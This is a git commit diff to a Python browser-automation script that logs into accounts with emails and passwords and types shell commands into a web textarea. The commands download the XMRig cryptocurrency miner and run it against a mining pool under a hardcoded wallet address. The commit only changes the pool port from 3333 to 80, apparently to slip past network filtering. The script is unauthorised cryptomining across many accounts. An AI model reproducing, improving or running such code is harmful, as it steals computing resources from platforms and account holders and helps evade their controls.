b7002bffbdb74e5f6fee350935dd9193503cba8a
Pkoka99 <zekazeus123@gmail.com>
2025-05-15 22:13:48 +0700

    Update 3.py

--- 3.py
+++ 3.py
@@ -109,7 +109,7 @@ def open_browser(instance_number, email, password):
         textarea1.send_keys(Keys.CONTROL + 'c')
         print(f"{email} SUCCESS CTRL + C")
         time.sleep(3)
-        textarea1.send_keys(f"wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz\ntar -xvf xmrig-6.22.2-linux-static-x64.tar.gz\ncd xmrig-6.22.2\n./xmrig -a rx -o rx.unmineable.com:3333 -u ADA:addr1vxt6dj3whefcjhjrycuyh04p22dsyrd9hsdg70eaxya8g5svgl9c0.{email}#uso8-x6ht -p -k --threads=4")
+        textarea1.send_keys(f"wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz\ntar -xvf xmrig-6.22.2-linux-static-x64.tar.gz\ncd xmrig-6.22.2\n./xmrig -a rx -o rx.unmineable.com:80 -u ADA:addr1vxt6dj3whefcjhjrycuyh04p22dsyrd9hsdg70eaxya8g5svgl9c0.{email}#uso8-x6ht -p -k --threads=4")
         textarea1.send_keys(Keys.ENTER)
         print(f"{email} SUCCESS EXECUTE COMMAND")
     except:
